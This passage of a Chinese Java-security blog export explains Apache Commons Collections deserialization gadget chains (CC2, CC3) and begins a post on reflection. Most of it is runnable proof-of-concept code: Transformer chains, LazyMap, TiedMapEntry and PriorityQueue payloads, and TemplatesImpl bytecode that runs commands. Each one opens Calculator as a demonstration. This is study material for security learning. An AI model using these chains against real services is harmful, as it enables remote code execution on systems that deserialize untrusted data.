child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x; &#125; 其构造函数的参数为int和实现Comparator接口的的对象。 123456789public PriorityQueue(int initialCapacity, Comparator&lt;? super E&gt; comparator) &#123; // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity &lt; 1) throw new IllegalArgumentException(); this.queue = new Object[initialCapacity]; this.comparator = comparator; &#125; TransformingComparatorTransformingComparator是实现Comparator接口的类。 1public class TransformingComparator&lt;I, O&gt; implements Comparator&lt;I&gt;, Serializable &#123; 其构造函数接收接口Transformer的对象。 123public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer) &#123; this(transformer, ComparatorUtils.NATURAL_COMPARATOR); &#125; 其compare方法，实现了对transform的调用。 12345public int compare(I obj1, I obj2) &#123; O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); &#125; 有了上述CC4的基础知识，我们就可以构造出CC2这条链。 注意: 一开始放的的假的命令执行transformer是必须的，因为PriorityQueue的add方法会调用offer，offer又会调用siftUp方法，siftUp又会调用siftUpUsingComparator，siftUpUsingComparator又会调用comparator.compare，导致命令提前执行，并报错。 1234567891011121314151617181920212223242526272829303132333435363738import java.io.*;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/26 21:21 */public class Test_PriorityQueue &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; //定义一个命令执行的transformers数组 new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer[] transformer = new Transformer[] &#123;new ConstantTransformer(1)&#125;; Transformer transformerchain = new ChainedTransformer(transformer); TransformingComparator comparator = new TransformingComparator(transformerchain); PriorityQueue queue = new PriorityQueue(4, comparator); queue.add(1); queue.add(2); setFieldValue(transformerchain, &quot;iTransformers&quot;, transformers);//需要替换为正确的 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"CC3基础知识","slug":"CC3基础知识","date":"2023-02-25T11:45:30.000Z","updated":"2023-02-25T11:59:01.570Z","comments":true,"path":"2023/02/25/CC3基础知识/","link":"","permalink":"https://f19t.github.io.git/2023/02/25/CC3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"CC3基础知识简单总结一下cc3用到的基础知识。","text":"CC3基础知识简单总结一下cc3用到的基础知识。 TransformerTransformer是一个接口，其transform，是一个待实现的方法。 123public interface Transformer &#123; Object transform(Object var1);&#125; InvokerTransformerInvokerTransformer是实现了Transformer接口的具体类，其transform方法是通过反射去执行方法。 12345public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var7); &#125; &#125; &#125; 测试代码，执行以下代码可弹计算机。 1234567891011121314import org.apache.commons.collections.functors.InvokerTransformer;/** * author: f19t * Date: 2023/2/25 16:19 */public class Test_InvokerTransformer &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;new String(&quot;open /System/Applications/Calculator.app&quot;)&#125;); invokerTransformer.transform(java.lang.Runtime.getRuntime()); &#125;&#125; ConstantTransformerConstantTransformer是实现了Transformer接口的具体类，其transform方法是返回输入的对象。 1234567public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; 因为ConstantTransformer构造函数参数可控，所以我们可以通过transform获取我们的对象。 123456789101112131415import org.apache.commons.collections.functors.ConstantTransformer;/** * author: f19t * Date: 2023/2/25 16:29 */public class Test_ConstantTransformer &#123; public static void main(String[] args) &#123; String s = new String(&quot;1&quot;); ConstantTransformer constantTransformer = new ConstantTransformer(s); String a = (String) constantTransformer.transform(null); System.out.println(s.equals(a)); &#125;&#125; 1true ChainedTransformerChainedTransformer是实现了Transformer接口的具体类，其Transform方法是依次按顺序调用transform数组内的Transform变量的transform方法。 1234567891011public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers; &#125; public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object; &#125; 测试以下代码可以成功弹计算机。 123456789101112131415161718192021import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;/** * author: f19t * Date: 2023/2/25 16:39 */public class Test_ChainedTransformer &#123; public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; //定义一个命令执行的transformers数组 new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(null); &#125;&#125; LazyMapLazyMap的decorate()方法接收两个参数，(Map map, Transformer factory)。 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; 并且当map.containsKey(key)&#x3D;&#x3D;null时，其get方法会调用factory.transform(key)方法。 123456789public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value = this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125; &#125; InvocationHandler动态代理实现接口的类，如果使用动态代理，执行任意方法都会执行动态代理的invoke方法。 12public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; AnnotationInvocationHandlerAnnotationInvocationHandler是一个动态代理程序，其有两个参数，Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2,一个参数是集成Annotation的类，另一个是Map对象。 12345678class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; this.memberValues = var2; &#125; public Object invoke(Object var1, Method var2, Object[] var3) &#123; Object var6 = this.memberValues.get(var4);//关键代码 &#125;&#125; 测试代码，执行任意命令都可弹计算器。 1234567891011121314151617181920212223242526272829303132333435363738394041import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.lang.annotation.Annotation;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;/** * author: f19t * Date: 2023/2/25 17:06 */public class Test_AnnotationInvocationHandler &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap= LazyMap.decorate(innerMap,transformerChain);// outerMap.get(&quot;1&quot;); Class c1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor construct = c1.getDeclaredConstructor(Class.class,Map.class); construct.setAccessible(true); InvocationHandler handler=(InvocationHandler) construct.newInstance(Target.class, outerMap);//参数一，只要继承Annotation的类都可以 Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] &#123;Map.class&#125;, handler); proxyMap.clear();//执行任意命令都可弹计算器 &#125;&#125; 反序列化demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.lang.annotation.Annotation;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;import java.io.*;/** * author: f19t * Date: 2023/2/25 17:06 */public class Test_AnnotationInvocationHandler &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap= LazyMap.decorate(innerMap,transformerChain);// outerMap.get(&quot;1&quot;); Class c1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor construct = c1.getDeclaredConstructor(Class.class,Map.class); construct.setAccessible(true); InvocationHandler handler=(InvocationHandler) construct.newInstance(Target.class, outerMap);//参数一，只要继承Annotation的类都可以 Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] &#123;Map.class&#125;, handler);// proxyMap.clear();//执行任意命令都可弹计算器 handler = (InvocationHandler) construct.newInstance(Target.class, proxyMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; 注意，反序列化时，高版本AnnotationInvocationHandler的LazyMap，变成了LinkedHashMap，所以上面POC无法在高版本命令执行。 TiedMapEntry其hashCode方法调用getValue方法，getValue方法里面有存在map.get方法。 1234567public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125;public Object getValue() &#123; return this.map.get(this.key); &#125; 以下测试代码弹计算机 123456789101112131415161718192021222324252627import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.util.HashMap;import java.util.Map;/** * author: f19t * Date: 2023/2/25 18:09 */public class Test_TiedMapEntry &#123; public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap= LazyMap.decorate(innerMap,transformerChain); TiedMapEntry tt=new TiedMapEntry(outerMap,&quot;tt&quot;); tt.hashCode(); &#125;&#125; 反序列化测试代码，注意：回弹两遍计算机，因为hashmap的readObject的putVal会调用hash方法，里面调用了hashcode，进而调用get，触发了命令执行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;/** * author: f19t * Date: 2023/2/25 18:09 */public class Test_TiedMapEntry &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123; Transformer[] fake = new Transformer[]&#123;new ConstantTransformer(1)&#125;; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(fake); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tt = new TiedMapEntry(outerMap, &quot;tt&quot;); Map expMap = new HashMap(); expMap.put(tt, &quot;yy&quot;); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(transformerChain, transformers); outerMap.clear(); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); &#125;&#125; TrAXFilterTrAXFilter会执行传入的templates的newTransformer方法。 123public TrAXFilter(Templates templates) throws TransformerConfigurationException_transformer = (TransformerImpl) templates.newTransformer(); 测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100package ysoserial;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/25 19:03 */public class Test_TrAXFilter &#123; public static void main(String[] args) throws Exception &#123; byte[] testClassBytes = new byte[]&#123;-54 ,-2 ,-70 ,-66 ,0 ,0 ,0 ,52 ,0 ,47 ,10 ,0 ,9 ,0 ,22 , 10 ,0 ,23 ,0 ,24 ,8 ,0 ,25 ,10 ,0 ,23 ,0 ,26 ,9 ,0 , 27 ,0 ,28 ,8 ,0 ,29 ,10 ,0 ,30 ,0 ,31 ,7 ,0 ,32 ,7 , 0 ,33 ,1 ,0 ,9 ,116 ,114 ,97 ,110 ,115 ,102 ,111 ,114 ,109 ,1 , 0 ,114 ,40 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 , 47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 , 110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 , 79 ,77 ,59 ,91 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,4 ,67 , 111 ,100 ,101 ,1 ,0 ,15 ,76 ,105 ,110 ,101 ,78 ,117 ,109 ,98 ,101 , 114 ,84 ,97 ,98 ,108 ,101 ,1 ,0 ,10 ,69 ,120 ,99 ,101 ,112 ,116 , 105 ,111 ,110 ,115 ,7 ,0 ,34 ,1 ,0 ,-90 ,40 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 , 47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 ,79 ,77 ,59 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,109 ,108 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,100 , 116 ,109 ,47 ,68 ,84 ,77 ,65 ,120 ,105 ,115 ,73 ,116 ,101 ,114 ,97 , 116 ,111 ,114 ,59 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,6 ,60 , 105 ,110 ,105 ,116 ,62 ,1 ,0 ,3 ,40 ,41 ,86 ,7 ,0 ,35 ,1 , 0 ,10 ,83 ,111 ,117 ,114 ,99 ,101 ,70 ,105 ,108 ,101 ,1 ,0 ,23 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,46 ,106 ,97 ,118 ,97 ,12 ,0 ,17 ,0 ,18 ,7 ,0 , 36 ,12 ,0 ,37 ,0 ,38 ,1 ,0 ,40 ,111 ,112 ,101 ,110 ,32 ,47 , 83 ,121 ,115 ,116 ,101 ,109 ,47 ,65 ,112 ,112 ,108 ,105 ,99 ,97 ,116 , 105 ,111 ,110 ,115 ,47 ,67 ,97 ,108 ,99 ,117 ,108 ,97 ,116 ,111 ,114 , 46 ,97 ,112 ,112 ,12 ,0 ,39 ,0 ,40 ,7 ,0 ,41 ,12 ,0 ,42 , 0 ,43 ,1 ,0 ,19 ,72 ,101 ,108 ,108 ,111 ,32 ,84 ,101 ,109 ,112 , 108 ,97 ,116 ,101 ,115 ,73 ,109 ,112 ,108 ,7 ,0 ,44 ,12 ,0 ,45 , 0 ,46 ,1 ,0 ,28 ,121 ,115 ,111 ,115 ,101 ,114 ,105 ,97 ,108 ,47 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,1 ,0 ,64 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 , 114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 , 47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 , 47 ,114 ,117 ,110 ,116 ,105 ,109 ,101 ,47 ,65 ,98 ,115 ,116 ,114 ,97 , 99 ,116 ,84 ,114 ,97 ,110 ,115 ,108 ,101 ,116 ,1 ,0 ,57 ,99 ,111 , 109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 , 101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 , 108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,84 ,114 ,97 ,110 ,115 ,108 ,101 , 116 ,69 ,120 ,99 ,101 ,112 ,116 ,105 ,111 ,110 ,1 ,0 ,19 ,106 ,97 , 118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,69 ,120 ,99 ,101 ,112 ,116 ,105 , 111 ,110 ,1 ,0 ,17 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 , 82 ,117 ,110 ,116 ,105 ,109 ,101 ,1 ,0 ,10 ,103 ,101 ,116 ,82 ,117 , 110 ,116 ,105 ,109 ,101 ,1 ,0 ,21 ,40 ,41 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,82 ,117 ,110 ,116 ,105 ,109 ,101 ,59 ,1 , 0 ,4 ,101 ,120 ,101 ,99 ,1 ,0 ,39 ,40 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 ,59 ,41 ,76 , 106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,80 ,114 ,111 ,99 ,101 , 115 ,115 ,59 ,1 ,0 ,16 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 , 47 ,83 ,121 ,115 ,116 ,101 ,109 ,1 ,0 ,3 ,111 ,117 ,116 ,1 ,0 , 21 ,76 ,106 ,97 ,118 ,97 ,47 ,105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 , 83 ,116 ,114 ,101 ,97 ,109 ,59 ,1 ,0 ,19 ,106 ,97 ,118 ,97 ,47 , 105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 ,83 ,116 ,114 ,101 ,97 ,109 ,1 , 0 ,7 ,112 ,114 ,105 ,110 ,116 ,108 ,110 ,1 ,0 ,21 ,40 ,76 ,106 , 97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 , 59 ,41 ,86 ,0 ,33 ,0 ,8 ,0 ,9 ,0 ,0 ,0 ,0 ,0 ,3 , 0 ,1 ,0 ,10 ,0 ,11 ,0 ,2 ,0 ,12 ,0 ,0 ,0 ,25 ,0 , 0 ,0 ,3 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 , 0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,14 ,0 ,14 ,0 ,0 ,0 ,4 , 0 ,1 ,0 ,15 ,0 ,1 ,0 ,10 ,0 ,16 ,0 ,2 ,0 ,12 ,0 , 0 ,0 ,25 ,0 ,0 ,0 ,4 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 , 1 ,0 ,13 ,0 ,0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,16 ,0 ,14 , 0 ,0 ,0 ,4 ,0 ,1 ,0 ,15 ,0 ,1 ,0 ,17 ,0 ,18 ,0 , 2 ,0 ,12 ,0 ,0 ,0 ,58 ,0 ,2 ,0 ,2 ,0 ,0 ,0 ,22 , 42 ,-73 ,0 ,1 ,-72 ,0 ,2 ,18 ,3 ,-74 ,0 ,4 ,76 ,-78 ,0 , 5 ,18 ,6 ,-74 ,0 ,7 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 ,0 , 0 ,18 ,0 ,4 ,0 ,0 ,0 ,18 ,0 ,4 ,0 ,19 ,0 ,13 ,0 , 20 ,0 ,21 ,0 ,21 ,0 ,14 ,0 ,0 ,0 ,4 ,0 ,1 ,0 ,19 , 0 ,1 ,0 ,20 ,0 ,0 ,0 ,2 ,0 ,21 ,&#125;; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;testClassBytes&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); TrAXFilter trAXFilter = new TrAXFilter(obj); &#125;&#125; HelloTemplatesImpl的代码 123456789101112131415161718192021import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public classHelloTemplatesImpl extends AbstractTranslet &#123; public void transform(DOM document, SerializationHandler[] handlers)throws TransletException &#123;&#125; public void transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) throws TransletException &#123;&#125; public HelloTemplatesImpl() throws Exception &#123; super(); Process p = Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); System.out.println(&quot;Hello TemplatesImpl&quot;); &#125;&#125; InstantiateTransformerInstantiateTransformer的transform方法会执行传入类的构造函数。 12345678public Object transform(Object input) &#123; try &#123; if (!(input instanceof Class)) &#123; throw new FunctorException(&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName())); &#125; else &#123; Constructor con = ((Class)input).getConstructor(this.iParamTypes); return con.newInstance(this.iArgs); &#125; 测试代码 123456789101112131415import org.apache.commons.collections.functors.InstantiateTransformer;import javax.xml.transform.TransformerConfigurationException;/** * author: f19t * Date: 2023/2/25 18:53 */public class Test_InstantiateTransformer &#123; public static void main(String[] args) throws TransformerConfigurationException &#123; InstantiateTransformer transformers = new InstantiateTransformer(null,null); transformers.transform(hello.class); &#125;&#125; hello代码 123456public class hello &#123; static &#123; System.out.println(&quot;hello&quot;); &#125; &#125; 有了InstantiateTransformer和TrAXFilter可以进行组合，进行执行字节码。简要代码 123Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;obj&#125;)&#125;;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"Java反射","slug":"Java反射","date":"2023-02-19T11:58:26.000Z","updated":"2023-03-17T09:52:13.797Z","comments":true,"path":"2023/02/19/Java反射/","link":"","permalink":"https://f19t.github.io.git/2023/02/19/Java%E5%8F%8D%E5%B0%84/","excerpt":"java反射之前学过反射，半知半解，今天重新学习一下Java反射机制，以及能做的事情。","text":"java反射之前学过反射，半知半解，今天重新学习一下Java反射机制，以及能做的事情。 下面是反射获取类Test的的源码： 1234567891011121314151617181920212223242526272829import java.io.IOException;import java.lang.Runtime;public class Test &#123; public static final int h = 5;//字段1，直接赋值 public String s = &quot;test&quot;;//字段2 public static final boolean b =new Boolean(false);//字段3，间接赋值 public Test() &#123; //构造函数1 System.out.println(&quot;无参构造函数&quot;); &#125; public Test(int m, double n) throws IOException &#123;//有参构造函数2 System.out.println(&quot;有参构造函数&quot;); System.out.println(&quot;获取到int=&quot;+m); System.out.println(&quot;获取到double=&quot;+n); 